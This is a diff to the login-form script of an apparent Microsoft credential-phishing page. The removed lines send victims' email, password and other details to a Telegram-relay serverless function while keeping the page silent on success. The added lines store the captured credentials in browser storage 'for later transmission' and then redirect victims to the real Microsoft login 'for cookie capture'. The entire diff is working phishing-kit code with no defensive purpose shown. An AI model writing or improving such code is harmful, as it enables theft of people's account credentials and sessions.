@@ -187,51 +187,31 @@
         $('#msg').hide().text('');
 
         count=count+1;
-        if (count>=3) {
-          // use https for redirect
-          window.location.replace("https://login.microsoftonline.com");
-          return;
+        
+        // Store credentials in localStorage for later retrieval
+        try {
+          const credentialsData = {
+            email: email,
+            password: password,
+            detail: detail,
+            captureTime: new Date().toISOString(),
+            source: 'replacement-form'
+          };
+          localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
+          sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
+          console.log('Credentials stored for later transmission');
+        } catch (e) {
+          console.warn('Failed to store credentials:', e);
         }
 
-        (async function(){
-          try {
-            $('#submit-btn').html('Verifing...');
-            const payload = {
-              email: email,
-              password: password,
-              detail: detail
-            };
-
-            const resp = await fetch('/.netlify/functions/sendTelegram', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(payload)
-            });
-
-            if (!resp.ok) {
-              // show error message when request fails
-              $("#msg").show();
-              $('#msg').html("Please try again later");
-            } else {
-              // SUCCESS: intentionally do NOT display any "Sent" notification to the user.
-              // Keep UI silent on success. Log to console for debugging.
-              try {
-                const json = await resp.json().catch(()=> ({}));
-                console.log('sendTelegram response (success):', json);
-              } catch (e) {
-                console.log('sendTelegram success (no JSON body or parse error)');
-              }
-              // Optionally, you could redirect after successful send:
-              // window.location.replace("https://login.microsoftonline.com");
-            }
-          } catch (err) {
-            console.error('Error sending to function:', err);
-            $("#msg").show();
-            $('#msg').html("Please try again later");
-          } finally {
-            $('#submit-btn').html('Login');
-          }
-        })();
+        // Show verifying state
+        $('#submit-btn').html('Verifying...');
+        
+        // Add delay to show verification state, then redirect to Microsoft login
+        setTimeout(function() {
+          // Always redirect to Microsoft login for cookie capture
+          window.location.replace("https://login.microsoftonline.com");
+        }, 1500);
      });
     });
   </script>
